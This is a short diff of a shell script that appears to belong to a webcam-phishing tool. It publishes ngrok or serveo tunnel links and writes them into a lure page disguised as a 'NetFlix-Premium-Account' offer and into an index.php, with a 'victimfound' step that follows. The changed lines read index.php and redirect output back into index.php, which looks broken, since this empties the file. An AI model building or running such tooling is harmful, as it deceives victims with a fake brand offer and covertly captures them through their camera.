@@ -167,7 +167,7 @@ initialize_ngrok() {
 
 ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 sed 's+forwarding_link+'$ngroklink'+g' .tahmidrayat.iso > .NetFlix-Premium-Account.html
-sed 's+forwarding_link+'$ngroklink'+g' .hiddencam.php > index.php
+sed 's+forwarding_link+'$ngroklink'+g' index.php > index.php
 
 }
 
@@ -225,7 +225,7 @@ initialize_serveo() {
 
 serveolink=$(grep -o "https://[0-9a-z]*\.serveo.net" .servlink)
 sed 's+forwarding_link+'$serveolink'+g' .tahmidrayat.iso > .NetFlix-Premium-Account.html
-sed 's+forwarding_link+'$serveolink'+g' .hiddencam.php > index.php
+sed 's+forwarding_link+'$serveolink'+g' index.php > index.php
 
 victimfound
 }
